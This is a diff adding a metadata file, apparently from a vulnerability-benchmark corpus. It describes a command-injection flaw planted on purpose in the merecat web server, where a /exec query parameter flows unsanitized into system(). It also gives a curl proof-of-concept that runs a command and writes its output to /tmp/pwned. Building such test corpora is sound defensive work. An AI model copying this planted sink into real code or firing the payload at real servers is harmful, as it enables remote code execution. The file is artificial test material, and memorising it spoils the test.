@@ -1,0 +1,59 @@
+PACKAGE:     merecat
+COMMIT:      57a2ce7c0cca65579f57d248ef89300eb22c2d97
+SOURCE:      /home/ubuntu/anthropic/corpus/merecat/
+AXES:        C1c I1 S3
+
+DESCRIPTION:
+  Three-flag-gated command injection. The server must be started with all three
+  flags (--exec-mode, --exec-logging, --exec-init) for the vulnerable endpoint
+  to be reachable. A user-supplied URL query parameter flows directly into
+  system(). The S3 sanitization is bypassed by omitting --strict-exec.
+
+CONFIG_GATE (C3 — complex):
+  mechanism:  three CLI flags stored in globals exec_mode, exec_logging,
+              exec_initialized; utility function exec_is_ready() returns
+              the conjunction of all three
+  check:      `if (exec_is_ready() && strncmp(hc->encodedurl, "/exec", 5) == 0 ...)`
+  complexity: three conditions, three flags, utility function, no struct
+
+INPUT_FLOW (I1 — direct):
+  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query (set during parsing)
+  path:       httpd_start_request() dispatches to handle_exec()
+              handle_exec() extracts substring after "cmd=" via strncmp/pointer
+              the raw query string is passed directly to system()
+  transforms: none — no urldecode(), no snprintf() buffering, no copy
+
+SANITIZATION (S3 — config-gated, bypassed by omission):
+  gate:       --strict-exec flag; if absent exec_strict == 0
+  check:      `if (exec_strict) { strpbrk(cmd, "|;&`$(){}") != NULL ... }`
+  bypass:     omit --strict-exec on server startup
+
+SINK:        system() in handle_exec() (src/libhttpd.c, injected before httpd_start_request)
+
+CHANGED FILES:
+  src/merecat.c — 3 hunks:
+    1. globals:         added exec_mode, exec_logging, exec_initialized, exec_strict
+    2. usage():         added --exec-mode, --exec-logging, --exec-init, --strict-exec entries
+    3. main():          pre-scan loop compacts all four exec flags out of argv before getopt
+
+  src/libhttpd.c — 2 hunks:
+    1. extern decls:    added extern declarations for all four exec globals
+    2. exec_is_ready(): new utility function before httpd_start_request()
+    3. handle_exec():   new function; I1/S3 implementation
+    4. httpd_start_request(): exec route guard using exec_is_ready()
+
+EXPLOIT:
+  build:   bash build.sh
+  start:   ./merecat -n -p 18052 /tmp/www --exec-mode --exec-logging --exec-init
+  trigger: curl 'http://127.0.0.1:18052/exec?cmd=id>/tmp/pwned'
+  verify:  cat /tmp/pwned
+  expect:  uid=... line written by the server process
+
+  gate bypass: omitting any of the three flags causes /exec to return 404.
+  S3 bypass:   omit --strict-exec so exec_strict stays 0 and the strpbrk
+               check is never reached.
+
+NOTES:
+  - system() output goes to server stdout/stderr, not the HTTP response body.
+    Use write-to-file payloads (id>/tmp/pwned) to confirm blind execution.
+  - The server runs in foreground mode (-n) to avoid daemonization for PoC use.
